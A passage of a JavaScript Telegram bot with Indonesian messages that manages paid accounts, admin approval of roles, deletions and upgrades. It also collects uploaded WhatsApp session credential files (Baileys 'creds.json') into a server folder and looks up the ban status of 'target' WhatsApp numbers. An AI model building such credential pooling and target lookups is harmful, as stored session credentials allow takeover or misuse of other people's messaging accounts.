- Password tidak boleh kosong
- Role harus salah satu dari daftar role
- Durasi harus angka 1-36500
          `.trim(), { parse_mode: "HTML" });
        }

        pendingTelegramInput.set(Number(id), {
          type: "create_account_photo",
          step: "waiting_photo",
          mode: "manual",
          data: {
            username: username,
            password: password,
            role: role,
            day: day
          }
        });

        await bot.sendRichMessage(chatId, `
✅ Data berhasil diterima!

Sekarang silakan kirimkan <b>FOTO</b> bukti transfer untuk melanjutkan.

Ketik /batal untuk membatalkan.
        `.trim(), { parse_mode: "HTML" });
        return;
      }

      // ─── HANDLER CREATE ACCOUNT PHOTO (TEXT) ─────────────────────
      if (pending.type === "create_account_photo") {
        return bot.sendRichMessage(chatId, `
❌ Kamu harus mengirimkan <b>FOTO</b> bukti transfer.
Silakan kirim foto bukti, atau ketik /batal untuk membatalkan.
        `.trim(), { parse_mode: "HTML" });
      }

    } catch (err) {
      console.error("[TELEGRAM INPUT]", err);
      pendingTelegramInput.delete(Number(id));
      return bot.sendRichMessage(id, createErrorPanel(" Terjadi kesalahan saat memproses input. Silakan coba lagi."), { parse_mode: "HTML" });
    }
  }

  // ============================================================
  // 📝 HANDLE CUSTOM DAYS DARI ADMIN (untuk create account)
  // ============================================================
  let customRequest = null;
  let customTargetId = null;
  for (const [key, value] of pendingCreateRequests.entries()) {
    if (value.waitingCustomDays === true && value.userId === id) {
      customRequest = value;
      customTargetId = key;
      break;
    }
  }

  if (customRequest && msg.text && !/^\/?(start|menu|create|buatakun|batal)\b/i.test(msg.text)) {
    const input = msg.text.trim().toLowerCase();
    let daysValue = 0;

    if (input === 'permanen' || input === 'permanent') {
      daysValue = 0;
    } else {
      const parsed = parseInt(input);
      if (isNaN(parsed) || parsed <= 0) {
        return bot.sendRichMessage(chatId, `
❌ <b>Input tidak valid!</b>
Masukkan angka positif (contoh: <code>99</code>) atau ketik <code>permanen</code>.
        `, { parse_mode: "HTML" });
      }
      daysValue = parsed;
    }

    delete customRequest.waitingCustomDays;
    pendingCreateRequests.set(customTargetId, customRequest);

    const role = customRequest.selectedRole || 'member';
    const msgIdToEdit = customRequest.durationMessageId || msg.message_id;

    await processCreateAccount(chatId, msgIdToEdit, customTargetId, role, daysValue, customRequest);
    return;
  }

  // ─── HANDLE FILE JSON (UPLOAD CREDS) ──────────────────────────────
  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) return;
    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());
      if (!isValidBaileysCreds(jsonData)) return bot.sendRichMessage(chatId, createErrorPanel(' File tersebut bukan creds.json valid dari Baileys.'), { parse_mode: "HTML" });
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) fs.mkdirSync(userFolder, { recursive: true });
      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);
      if (fs.existsSync(savePath)) {
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${Date.now()}.json`;
      }
      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));
      return bot.sendRichMessage(chatId, createSuccessPanel("FILE UPLOAD", [["Nama File", finalName], ["Status", "BERHASIL"]]), { parse_mode: "HTML" });
    } catch (err) {
      console.error(err);
      return bot.sendRichMessage(chatId, createErrorPanel(' Terjadi kesalahan saat memproses file.'), { parse_mode: "HTML" });
    }
  }

  // ─── 🔥 HANDLE FOTO UNTUK CREATE ACCOUNT (KIRIM KE ADMIN) ──
  if (msg.photo) {
    console.log("[PHOTO] Foto diterima dari user:", id);
    const pending = pendingTelegramInput.get(Number(id));
    console.log("[PHOTO] Pending state:", pending);

    if (pending && pending.type === "create_account_photo") {
      const photo = msg.photo[msg.photo.length - 1];
      const fileId = photo.file_id;
      const caption = msg.caption || '';

      const mode = pending.mode || "auto";
      const userData = pending.data || null;

      pendingTelegramInput.delete(Number(id));

      const requestData = {
        userId: id,
        username: msg.from.username || msg.from.first_name,
        firstName: msg.from.first_name,
        lastName: msg.from.last_name || '',
        photoFileId: fileId,
        caption: caption,
        timestamp: new Date().toISOString(),
        mode: mode,
        data: userData,
        waitingCustomDays: false,
        selectedRole: null,
        durationMessageId: null
      };

      pendingCreateRequests.set(id, requestData);
      console.log("[PHOTO] Request disimpan ke pendingCreateRequests dengan ID:", id);

      const adminMessage = `
<blockquote>📌 <b>Permintaan Create Akun Baru</b></blockquote>

👤 <b>User:</b> ${requestData.username}
🆔 <b>ID:</b> ${requestData.userId}
👤 <b>Nama:</b> ${requestData.firstName} ${requestData.lastName}
📅 <b>Waktu:</b> ${requestData.timestamp}
📸 <b>Foto bukti:</b> (file ID: ${fileId})
      `;

      const cfg = loadTelegramConfig();
      const ownerList = cfg.ownerList || [];
      const mentions = ownerList.map(ownerId => `<a href="tg://user?id=${ownerId}">👤 Admin</a>`).join(' ');

      try {
        await bot.sendRichMessage({
          type: "photo",
          chatId: ADMIN_GROUP_ID,
          media: fileId,
          options: {
            caption: `${adminMessage}\n\n${mentions}`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ ACC", callback_data: `acc_create_${id}`, style: "success" },
                  { text: "❌ TOLAK", callback_data: `rej_create_${id}`, style: "danger" }
                ]
              ]
            }
          }
        });
        console.log("[PHOTO] Notifikasi admin berhasil dikirim ke:", ADMIN_GROUP_ID);
      } catch (err) {
        console.error("[PHOTO] Gagal kirim notifikasi admin:", err.message);
        try {
          await bot.sendPhoto(ADMIN_GROUP_ID, fileId, {
            caption: `${adminMessage}\n\n${mentions}`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ ACC", callback_data: `acc_create_${id}`, style: "success" },
                  { text: "❌ TOLAK", callback_data: `rej_create_${id}`, style: "danger" }
                ]
              ]
            }
          });
          console.log("[PHOTO] Notifikasi admin berhasil dikirim via sendPhoto");
        } catch (err2) {
          console.error("[PHOTO] Fallback sendPhoto juga gagal:", err2.message);
        }
      }

      await bot.sendRichMessage(chatId, createAccountRich("Succes Mengirim", [
        `${createUiEmoji(CREATE_UI_EMOJI.check, '✅')} Bukti pembayaran <b>diterima</b>.`,
        `${createUiEmoji(CREATE_UI_EMOJI.clock, '⏳')} Request masuk ke <b>antrian admin</b>.`,
        `${createUiEmoji(CREATE_UI_EMOJI.lock, '🔐')} Hasil akun akan dikirim <b>private</b>.`
      ], [[{ text: '🏠 MENU', callback_data: 'mainmenu', style: 'primary' }]]), { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: '🏠 MENU', callback_data: 'mainmenu', style: 'primary' }]] } });

      console.log("[PHOTO] Konfirmasi user berhasil dikirim ke:", chatId);
    } else {
      console.log("[PHOTO] Tidak ada pending state untuk user ini atau bukan tipe create_account_photo");
    }
  }
});

bot.on("callback_query", async (query) => {
  const userId = Number(query.from.id);
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data || "";
  const isOwner = telegramIsOwner(userId);
  const canCreate = telegramCanCreate(userId);

  const __managed = typeof data === 'string' && (
  data.startsWith('svc_') ||
  data.startsWith('aln_') ||
  data.startsWith('stn_')
);
if (!__managed) {
  try { await bot.answerCallbackQuery(query.id); } catch (_) {}
}

try {
  // ══════════════════════════════════════════════════════════════
  // 🆕 SERVICES DP HANDLER (PRIORITAS UTAMA)
    // Semua callback yang berawalan 'svc_' ditangani oleh modul servicesDP
    // ══════════════════════════════════════════════════════════════
    if (typeof data === 'string' && (data.startsWith('svc_') || data.startsWith('aln_') || data.startsWith('stn_'))) {
  try {
    const handled = await getServicesDP()?.handleCallback(query);
    if (handled) return;
  } catch (svcErr) {
    console.error('[SVC CALLBACK ERROR]', svcErr);
  }
  try {
    const handledStn = await getSetoran()?.handleCallback(query);
    if (handledStn) return;
  } catch (stnErr) {
    console.error('[STN CALLBACK ERROR]', stnErr);
  }
}

    // ─── MAIN MENU ────────────────────────────────────────────────
    if (data === "mainmenu") {
      return sendMainMenu(chatId);
    }

    // ─── PLAY SOUND ───────────────────────────────────────────────
    if (data === "play_sound") {
      const audioPath = path.join(__dirname, 'sound/play/sound.mp3');
      if (!fs.existsSync(audioPath)) {
        return bot.sendRichMessage(chatId, createErrorPanel("File audio tidak ditemukan."), { parse_mode: "HTML" });
      }
      return bot.sendRichMessage({
        type: "audio",
        chatId: chatId,
        media: audioPath,
        options: {
          caption: `<blockquote>🎵 <b>System Sound</b></blockquote>\n✨ Mclaren Project`,
          parse_mode: "HTML",
          title: "Startup Sound",
          performer: "Mclaren Project",
          reply_markup: { inline_keyboard: [[{ text: "📋 Menu", callback_data: "mainmenu" }]] }
        }
      });
    }

    // ─── CHECK JOIN ────────────────────────────────────────────────
    if (data === "check_join" || data === "check_free_join") {
      const join = await checkJoinedChannels(userId);
      if (!join.configured) {
        return bot.sendRichMessage(chatId, createErrorPanel(join.message), { parse_mode: "HTML" });
      }
      if (!join.ok) {
        return sendJoinGate(chatId, data === "check_free_join");
      }
      return sendMainMenu(chatId);
    }

    // ─── CREATE ACCOUNT ──────────────────────────────────────────
    if (data === "create_account_new" || data === "create_account") {
      if (!telegramCanRequestCreate(userId)) {
        return bot.sendRichMessage(chatId, createErrorPanel("ID Telegram tidak valid untuk membuat request."), { parse_mode: "HTML" });
      }
      pendingTelegramInput.delete(userId);
      const caption = createAccountRich("CREATE AKUN", [
        `${createUiEmoji(CREATE_UI_EMOJI.spark, '✨')} <b>Siap membuat akun baru.</b>`,
        `${createUiEmoji(CREATE_UI_EMOJI.user, '👤')} Format : <code>username | password | role | durasi</code>`,
        `${createUiEmoji(CREATE_UI_EMOJI.clock, '⏳')} Durasi : <b>1–36500 hari</b>`,
        `${createUiEmoji(CREATE_UI_EMOJI.camera, '📸')} Setelah data valid, kirim <b>foto bukti transfer</b>.`,
        '',
        `<i>Request diproses oleh admin dan hasil akun dikirim private.</i>`
      ]);
      return bot.sendRichMessage(chatId, caption, { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: '📝 FORMAT MANUAL', callback_data: 'create_method_manual', style: 'primary' }, { text: '⚡ OTOMATIS', callback_data: 'create_method_auto', style: 'success' }], [{ text: '❌ BATAL', callback_data: 'cancel_create', style: 'danger' }]] } });
    }

    // ─── CREATE FREE ──────────────────────────────────────────────
    if (data === "create_free") {
      const join = await checkJoinedChannels(userId);
      if (!join.configured || !join.ok) {
        return sendJoinGate(chatId, true);
      }
      pendingTelegramInput.set(userId, { type: "create_free" });
      const caption = panelForAction("CREATE FREE", [
        ["Durasi", "5 HARI"],
        ["Role", "MEMBER"],
        ["Command", "/createfree username password"],
        ["Contoh", "/createfree trial123 Pass123"]
      ], "Kirim command setelah memenuhi syarat join 2 channel.");
      return bot.sendRichMessage(chatId, caption, { parse_mode: "HTML" });
    }

    // ─── SET EXPIRE ──────────────────────────────────────────────
    if (data === "set_expire") {
      if (!canCreate) {
        return bot.sendRichMessage(chatId, createErrorPanel("Anda tidak memiliki izin untuk menambah durasi."), { parse_mode: "HTML" });
      }
      pendingTelegramInput.set(userId, { type: "set_expire" });
      const caption = panelForAction("TAMBAH DURASI", [
        ["Format", "username|tambah_hari"],
        ["Contoh", "demo|30"]
      ], null);
      return bot.sendRichMessage(chatId, caption, { parse_mode: "HTML" });
    }

    // ─── DELETE USER (WIZARD DENGAN DAFTAR USER) ────────────────
    if (data === "delete_user") {
      if (!isOwner) {
        return bot.sendRichMessage(chatId, createErrorPanel("Khusus owner."), { parse_mode: "HTML" });
      }

      const db = loadDatabase();
      const users = db.map(u => u.username).sort((a, b) => a.localeCompare(b));
      if (users.length === 0) {
        return bot.sendRichMessage(chatId, createErrorPanel("Belum ada user terdaftar."), { parse_mode: "HTML" });
      }

      const totalPages = Math.ceil(users.length / USERS_PER_PAGE);
      deleteWizardState.set(userId, { page: 1, users, totalPages });

      await showDeleteUserPage(chatId, messageId, userId, 1);
      return;
    }

    // ─── DELETE WIZARD: NAVIGASI HALAMAN ──────────────────────────
    if (data.startsWith("del_page_")) {
      const page = parseInt(data.split('_')[2]);
      const state = deleteWizardState.get(userId);
      if (!state || page < 1 || page > state.totalPages) {
        return bot.sendRichMessage(chatId, '❌ Halaman tidak valid.', { parse_mode: "HTML" });
      }
      state.page = page;
      deleteWizardState.set(userId, state);
      await showDeleteUserPage(chatId, messageId, userId, page);
      return;
    }

    // ─── DELETE WIZARD: PILIH USER ──────────────────────────────
    if (data.startsWith("del_user_")) {
      const username = data.split('_').slice(2).join('_');
      const state = deleteWizardState.get(userId);
      if (!state) {
        return bot.sendRichMessage(chatId, '❌ Sesi kedaluwarsa. Silakan mulai ulang dari menu.', { parse_mode: "HTML" });
      }

      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ HAPUS", callback_data: `del_confirm_${username}`, style: "danger" },
            { text: "❌ BATAL", callback_data: "del_cancel", style: "primary" }
          ]
        ]
      };

      await bot.editMessageText(`
⚠️ <b>KONFIRMASI HAPUS AKUN</b>

Anda yakin ingin menghapus user <b>${username}</b>?

Tindakan ini tidak dapat dibatalkan.
      `, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: keyboard
      });
      return;
    }

    // ─── DELETE WIZARD: KONFIRMASI HAPUS ──────────────────────────
    if (data.startsWith("del_confirm_")) {
      const username = data.split('_').slice(2).join('_');
      const db = loadDatabase();
      const index = db.findIndex(u => u.username === username);
      if (index === -1) {
        return bot.sendRichMessage(chatId, createErrorPanel(`User ${username} tidak ditemukan.`), { parse_mode: "HTML" });
      }

      db.splice(index, 1);
      saveDatabase(db);
      deleteWizardState.delete(userId);

      const keyboard = {
        inline_keyboard: [
          [{ text: "📋 MENU UTAMA", callback_data: "mainmenu", style: "primary" }],
          [{ text: "🗑️ HAPUS LAGI", callback_data: "delete_user", style: "danger" }]
        ]
      };

      await bot.editMessageText(`
✅ <b>AKUN BERHASIL DIHAPUS</b>

User <b>${username}</b> telah dihapus dari database.
      `, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: keyboard
      });

      saveUserLog('system', 'delete_user',
        `User ${username} dihapus oleh owner ${query.from.username || query.from.first_name}`,
        `Telegram ID: ${userId}`
      );
      return;
    }

    // ─── DELETE WIZARD: BATAL ──────────────────────────────────────
    if (data === "del_cancel") {
      deleteWizardState.delete(userId);
      await bot.deleteMessage(chatId, messageId).catch(() => {});
      await bot.sendRichMessage(chatId, '❌ Penghapusan dibatalkan.', { parse_mode: "HTML" });
      return;
    }

    // ─── CHANNELS ──────────────────────────────────────────────────
    if (data === "channels") {
      const rows = REQUIRED_CHANNELS.map((channel, i) => [{ text: `CHANEL ${i + 1}`, url: getChannelUrl(channel) }]);
      rows.push([{ text: "CEK JOIN", callback_data: "check_join" }]);
      const caption = panelForAction("CHANEL", REQUIRED_CHANNELS.map((c, i) => [`CHANEL ${i + 1}`, c]), "Join channel menggunakan tautan yang tersedia.");
      return bot.sendRichMessage(chatId, caption, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: rows }
      });
    }

    // ─── ROLE MENU ──────────────────────────────────────────────────
    if (data === "role_menu") {
      const caption = panelForAction("MENU ROLE", [
        ["01", "member"],
        ["02", "vip"],
        ["03", "tukang_bubur"],
        ["04", "reseller"],
        ["05", "admin"],
        ["06", "partner"],
        ["07", "developers"],
        ["08", "partner_pribadi"],
        ["09", "tangan_kiri"],
        ["10", "tangan_kanan"],
        ["11", "ceo_utama"],
        ["12", "moderator"],
        ["13", "forius_utama"],
        ["14", "executorius"],
        ["15", "staff"],
        ["16", "owner"],
        ["17", "owner_utama"]
      ], "Role tersedia untuk command CREATE AKUN.");
      return bot.sendRichMessage(chatId, caption, { parse_mode: "HTML" });
    }

    // ─── PILIH METODE (dari command /create) ──────────────────────
    if (data === "create_method_manual") {
      pendingTelegramInput.set(Number(userId), {
        type: "create_account_manual",
        step: "waiting_input"
      });

      await bot.editRichMessage(
        `
<blockquote>📝 <b>Manual Custom Request</b></blockquote>

Silakan kirimkan format berikut:
<code>username | password | role | durasi_hari</code>

Contoh: <code>satoshi | xxo | vip | 99</code>

▸ Role yang tersedia: member, vip, tukang_bubur, reseller, admin, partner, developers, partner_pribadi, tangan_kiri, tangan_kanan, ceo_utama, moderator, forius_utama, executorius, staff, owner, owner_utama

▸ Durasi maksimal 36500 hari.

Ketik /batal untuk membatalkan.
        `.trim(),
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [] }
        }
      );
      return;
    }

    if (data === "create_method_auto") {
      pendingTelegramInput.set(Number(userId), {
        type: "create_account_photo",
        step: "waiting_photo",
        mode: "auto"
      });

      await bot.editRichMessage(
        `
<blockquote>🤖 <b>Otomatis Create</b></blockquote>

Bot akan membuatkan akun secara otomatis.
Username dan password akan digenerate acak.

Silakan kirimkan <b>FOTO</b> bukti transfer sekarang! 📸

Ketik /batal untuk membatalkan.
        `.trim(),
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [] }
        }
      );
      return;
    }

    if (data === "cancel_create") {
      pendingTelegramInput.delete(Number(userId));
      await bot.editRichMessage(
        "❌ Proses pembuatan akun dibatalkan.",
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [] }
        }
      );
      return;
    }

    // ─── CHECK BANNED VIP ──────────────────────────────────────────
    if (data === "check_banned_vip") {
      if (!isOwner) {
        return bot.sendRichMessage(chatId, createErrorPanel("❌ Fitur ini hanya untuk OWNER."), { parse_mode: "HTML" });
      }

      bannedWizardState.set(userId, { step: 'intro', messageId, chatId });

      const caption = `
<blockquote>📱 <b>CEK BANNED WHATSAPP VIP</b></blockquote>

Fitur ini akan mengecek status nomor WhatsApp target secara <b>real-time</b>.

📌 <b>Prosedur:</b>
1️⃣ Klik <b>LANJUT CEK</b> untuk mulai.
2️⃣ Masukkan nomor target (format internasional, boleh pakai <code>+</code> atau tidak).
3️⃣ Tunggu proses pengecekan (loading 0–100%).
4️⃣ Hasil akan ditampilkan lengkap.

⚠️ <b>Catatan:</b>
• Pastikan ada session WhatsApp aktif di server.
• Hanya untuk <b>OWNER</b>.
• Data diambil langsung dari WhatsApp.

Klik tombol di bawah untuk melanjutkan atau keluar.
      `;

      await bot.editMessageText(caption, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🚀 LANJUT CEK", callback_data: "banned_lanjut", style: "success" },
              { text: "❌ EXIT CEK", callback_data: "banned_exit", style: "danger" }
            ]
          ]
        }
      });
      return;
    }

    // ─── BANNED: LANJUT ──────────────────────────────────────────
    if (data === "banned_lanjut") {
      const state = bannedWizardState.get(userId);
      if (!state || state.step !== 'intro') {
        return bot.sendRichMessage(chatId, "⏳ Sesi tidak valid. Silakan mulai ulang dari menu.", { parse_mode: "HTML" });
      }

      state.step = 'waiting_number';
      bannedWizardState.set(userId, state);

      const caption = `
<blockquote>📱 <b>MASUKKAN NOMOR TARGET</b></blockquote>

Silakan kirimkan nomor WhatsApp yang ingin dicek.

📌 <b>Format:</b>
• Boleh dengan <code>+</code> atau tanpa.
• Contoh: <code>+6281227125165</code> atau <code>6281227125165</code>
• Minimal 10 digit setelah kode negara.

Ketik <b>/batal</b> untuk membatalkan proses ini.
      `;

      await bot.editMessageText(caption, {
        chat_id: chatId,
        message_id: state.messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "❌ EXIT CEK", callback_data: "banned_exit", style: "danger" }]
          ]
        }
      });
      return;
    }

    // ─── BANNED: EXIT ──────────────────────────────────────────────
    if (data === "banned_exit") {
      const state = bannedWizardState.get(userId);
      if (state && state.messageId) {
        await bot.editMessageText("❌ Proses cek banned dibatalkan.", {
          chat_id: chatId,
          message_id: state.messageId,
          parse_mode: "HTML"
        }).catch(() => {});
      } else {
        await bot.deleteMessage(chatId, messageId).catch(() => {});
      }
      bannedWizardState.delete(userId);
      return;
    }

    // ─── CANCEL ADD OWNER ──────────────────────────────────────────
    if (data === "cancel_addowner") {
      pendingTelegramInput.delete(userId);
      await bot.deleteMessage(chatId, messageId).catch(() => {});
      await bot.sendRichMessage(chatId, `
❌ <b>Dibatalkan</b>
Proses penambahan owner dibatalkan.
      `, { parse_mode: "HTML" });
      return;
    }

    // ================================================================
    // 🚀 FLOW CREATE ACCOUNT DENGAN ADMIN VERIFIKASI
    // ================================================================

    // ─── ACC / TOLAK ──────────────────────────────────────────────
    if (data.startsWith("acc_create_") || data.startsWith("rej_create_")) {
      const adminId = userId;
      const targetUserId = parseInt(data.split('_')[2]);
      const isAccept = data.startsWith("acc_create_");

      if (!telegramCanApproveCreate(adminId)) {
        await bot.answerCallbackQuery(query.id, { text: "❌ Kamu tidak punya akses ACC create.", show_alert: true }).catch(() => {});
        return;
      }

      const requestData = pendingCreateRequests.get(targetUserId);
      if (!requestData) {
        await bot.answerCallbackQuery(query.id, { text: "❌ Data request tidak ditemukan.", show_alert: true }).catch(() => {});
        return;
      }

      if (isAccept) {
        const roleButtons = [
          ["member", "vip", "tukang_bubur"],
          ["reseller", "admin", "partner"],
          ["developers", "partner_pribadi", "tangan_kiri"],
          ["tangan_kanan", "ceo_utama", "moderator"],
          ["forius_utama", "executorius", "staff"],
          ["owner", "owner_utama"]
        ];

        const inlineKeyboard = roleButtons.map(row =>
          row.map(role => {
            let style = "primary";
            if (role === "owner_utama" || role === "owner") style = "danger";
            else if (role === "vip" || role === "admin" || role === "partner") style = "success";
            return {
              text: role.toUpperCase(),
              callback_data: `acc_role_${targetUserId}_${role}`,
              style: style
            };
          })
        );
        inlineKeyboard.push([{ text: "❌ BATAL", callback_data: `rej_create_${targetUserId}`, style: "danger" }]);

        await bot.editRichMessage(
          `
<blockquote>📌 <b>Pilih Role untuk Akun Baru</b></blockquote>

👤 <b>User:</b> ${requestData.username}
🆔 <b>ID:</b> ${requestData.userId}
📸 <b>Foto bukti:</b> (file ID: ${requestData.photoFileId})

Silakan pilih role yang akan diberikan.
          `.trim(),
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: inlineKeyboard }
          }
        );

      } else {
        await bot.sendRichMessage(targetUserId, `
❌ <b>Maaf, permintaan pembuatan akun kamu ditolak.</b>
Silakan hubungi admin untuk informasi lebih lanjut.
        `.trim(), { parse_mode: "HTML" }).catch(() => {});

        await bot.sendRichMessage(ADMIN_GROUP_ID, `
❌ Permintaan dari user ${targetUserId} ditolak oleh admin.
        `.trim(), { parse_mode: "HTML" }).catch(() => {});

        await bot.editRichMessage(
          `
❌ <b>Permintaan Ditolak</b>

User: ${requestData.username} (ID: ${requestData.userId})
Status: DITOLAK oleh admin.
          `.trim(),
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [] }
          }
        );

        pendingCreateRequests.delete(targetUserId);
      }
      return;
    }

    // ─── PILIH ROLE ──────────────────────────────────────────────
    if (data.startsWith("acc_role_")) {
      const parts = data.split('_');
      const targetUserId = parseInt(parts[2]);
      const chosenRole = parts.slice(3).join('_');

      if (!telegramCanApproveCreate(userId)) {
        await bot.answerCallbackQuery(query.id, { text: "❌ Kamu tidak punya akses ACC create.", show_alert: true }).catch(() => {});
        return;
      }

      const requestData = pendingCreateRequests.get(targetUserId);
      if (!requestData) {
        await bot.answerCallbackQuery(query.id, { text: "❌ Data request tidak ditemukan.", show_alert: true }).catch(() => {});
        return;
      }

      if (!canApprovePrivilegedRole(userId, chosenRole)) {
        await bot.answerCallbackQuery(query.id, { text: "🛡️ Role OWNER hanya bisa diberikan oleh owner utama.", show_alert: true }).catch(() => {});
        return;
      }

      requestData.selectedRole = chosenRole;
      requestData.durationMessageId = messageId;
      pendingCreateRequests.set(targetUserId, requestData);

      const durationKeyboard = DURATION_OPTIONS.map(opt => {
        return [{
          text: opt.label,
          callback_data: `acc_days_${targetUserId}_${chosenRole}_${opt.value}`,
          style: opt.style || 'primary'
        }];
      });
      durationKeyboard.push([{ text: "❌ BATAL", callback_data: `rej_create_${targetUserId}`, style: "danger" }]);

      await bot.editRichMessage(
        `
<blockquote>📌 <b>Pilih Durasi untuk Akun Baru</b></blockquote>

👤 <b>User:</b> ${requestData.username}
🆔 <b>ID:</b> ${requestData.userId}
👑 <b>Role:</b> <b>${chosenRole.toUpperCase()}</b>

Silakan pilih durasi aktif akun.
        `.trim(),
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: durationKeyboard }
        }
      );
      return;
    }

    // ─── PILIH DURASI ──────────────────────────────────────────────
    if (data.startsWith("acc_days_")) {
      const parts = data.split('_');
      const targetUserId = parseInt(parts[2]);
      const role = parts.slice(3, -1).join('_');
      const daysValue = parseInt(parts[parts.length - 1]);

      if (!telegramCanApproveCreate(userId)) {
        await bot.answerCallbackQuery(query.id, { text: "❌ Kamu tidak punya akses ACC create.", show_alert: true }).catch(() => {});
        return;
      }

      const requestData = pendingCreateRequests.get(targetUserId);
      if (!requestData) {
        await bot.answerCallbackQuery(query.id, { text: "❌ Data request tidak ditemukan.", show_alert: true }).catch(() => {});
        return;
      }

      if (daysValue === -1) {
        requestData.waitingCustomDays = true;
        requestData.userId = userId;
        pendingCreateRequests.set(targetUserId, requestData);

        await bot.editRichMessage(
          `
<blockquote>✏️ <b>Custom Days</b></blockquote>

Kirimkan angka jumlah hari (contoh: <code>99</code>) atau ketik <code>permanen</code> untuk akun tanpa batas.

Ketik /batal untuk membatalkan.
          `.trim(),
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [] }
          }
        );
        return;
      }

      await processCreateAccount(chatId, messageId, targetUserId, role, daysValue, requestData);
      return;
    }

    // ================================================================
    // 👑 OWNER ROLE UPGRADE CALLBACK HANDLERS
    // ================================================================
    if (data.startsWith('upg_')) {
      if (!telegramIsOwner(userId)) {
        await bot.answerCallbackQuery(query.id, { text: '❌ Hanya OWNER yang dapat menggunakan fitur ini.', show_alert: true }).catch(() => {});
        return;
      }

      const state = upgradeWizardState.get(userId);
      const action = data.split('_')[1];

      if (action === 'cancel') {
        upgradeWizardState.delete(userId);
        await bot.editRichMessage(
          `<blockquote><b>❌ UPGRADE DIBATALKAN</b></blockquote>\n<blockquote>${upgradeCe(UPGRADE_EMOJI.shield, '🛡️')} Tidak ada perubahan yang disimpan ke <code>database.json</code>.</blockquote>`,
          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏠 MENU UTAMA', callback_data: 'mainmenu', style: 'primary' }]] } }
        );
        return;
      }

      if (action === 'page') {
        const page = Number(data.split('_')[2]);
        await showUpgradeUserPage(chatId, messageId, userId, page);
        return;
      }

      if (action === 'back' && data === 'upg_back_users') {
        await showUpgradeUserPage(chatId, messageId, userId, state?.page || 1);
        return;
      }

      if (action === 'user') {
        const dbIndex = Number(data.split('_')[2]);
        const db = loadDatabase();
        const targetUser = db[dbIndex];
        if (!targetUser?.username) {
          await bot.answerCallbackQuery(query.id, { text: '❌ User tidak ditemukan.', show_alert: true }).catch(() => {});
          return;
        }

        targetUser.__dbIndex = dbIndex;
        await showUpgradeCurrentRole(chatId, messageId, userId, targetUser);
        return;
      }

      if (action === 'current') {
        if (!state || !['SELECT_CURRENT_ROLE', 'SELECT_TARGET_ROLE'].includes(state.step)) {
          await bot.answerCallbackQuery(query.id, { text: '⏳ Sesi upgrade sudah berakhir. Ketik /upgrade lagi.', show_alert: true }).catch(() => {});
          return;
        }
        const selectedCurrent = data.slice('upg_current_'.length);
        const db = loadDatabase();
        const targetUser = db[state.targetIndex];
        if (!targetUser || targetUser.username !== state.targetUsername) {
          upgradeWizardState.delete(userId);
          await bot.answerCallbackQuery(query.id, { text: '❌ Data user berubah atau tidak ditemukan.', show_alert: true }).catch(() => {});
          return;
        }
        const actualRole = String(targetUser.role || 'member').toLowerCase();
        if (actualRole !== selectedCurrent) {
          await bot.answerCallbackQuery(query.id, { text: `⚠️ Role database sekarang: ${actualRole.toUpperCase()}`, show_alert: true }).catch(() => {});
          await showUpgradeCurrentRole(chatId, messageId, userId, Object.assign(targetUser, { __dbIndex: state.targetIndex }));
          return;
        }
        state.actualRole = actualRole;
        upgradeWizardState.set(userId, state);
        await showUpgradeTargetRoles(chatId, messageId, userId, state);
        return;
      }

      if (action === 'to') {
        if (!state || state.step !== 'SELECT_TARGET_ROLE') {
          await bot.answerCallbackQuery(query.id, { text: '⏳ Pilih target user terlebih dahulu.', show_alert: true }).catch(() => {});
          return;
        }

        const targetRole = data.slice('upg_to_'.length).toLowerCase();
        if (!UPGRADE_ROLE_ORDER.includes(targetRole)) {
          await bot.answerCallbackQuery(query.id, { text: '❌ Role target tidak valid.', show_alert: true }).catch(() => {});
          return;
        }

        const db = loadDatabase();
        const targetUser = db[state.targetIndex];
        if (!targetUser || targetUser.username !== state.targetUsername) {
          upgradeWizardState.delete(userId);
          await bot.answerCallbackQuery(query.id, { text: '❌ User tidak ditemukan.', show_alert: true }).catch(() => {});
          return;
        }

        const currentRole = String(targetUser.role || 'member').toLowerCase();
        if (upgradeRoleIndex(targetRole) <= upgradeRoleIndex(currentRole)) {
          await bot.answerCallbackQuery(query.id, { text: '❌ Target harus lebih tinggi dari role sekarang.', show_alert: true }).catch(() => {});
          return;
        }

        state.step = 'CONFIRM';
        state.targetRole = targetRole;
        state.actualRole = currentRole;
        upgradeWizardState.set(userId, state);

        const confirmKeyboard = {
          inline_keyboard: [
